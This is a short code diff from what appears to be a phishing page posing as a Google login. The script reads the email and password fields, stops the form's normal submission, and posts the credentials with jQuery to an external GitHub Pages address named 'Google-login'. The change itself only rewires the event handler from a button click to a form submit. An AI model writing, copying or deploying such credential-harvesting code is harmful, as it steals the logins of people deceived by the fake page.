@@ -31,8 +31,9 @@
     <script>
         const Emailadd = document.getElementById('email');
         const Password = document.getElementById('password');
-$(document).ready(function(){
-  $("button").click(function(){
+
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
         const email = Emailadd.value;
         const password = Password.value;
     $.post("https://dominator200.github.io/Google-login/",
